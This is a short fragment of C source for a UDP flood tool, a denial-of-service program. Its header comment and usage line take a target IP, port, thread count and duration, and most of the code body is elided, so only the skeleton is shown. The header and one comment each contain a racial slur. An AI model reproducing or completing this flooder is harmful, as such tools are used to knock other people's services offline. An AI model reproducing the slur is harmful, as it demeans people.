/*
 * Custom UDP Flood - Standalone x86/x64
 * by c0re_x64 for 0v.lol // nigga
 * usage: sudo ./cudp <ip> <port> <threads> <duration> [--size N][--static]
 */
...
static struct cudp_config config;
...
// nigga cudp
static void* cudp_thread(void *arg) {
...
int main(int argc, char **argv) {
    if (argc < 5) { printf("cudp <ip> <port> <threads> <duration> [--size N][--static]\n"); return 1; }
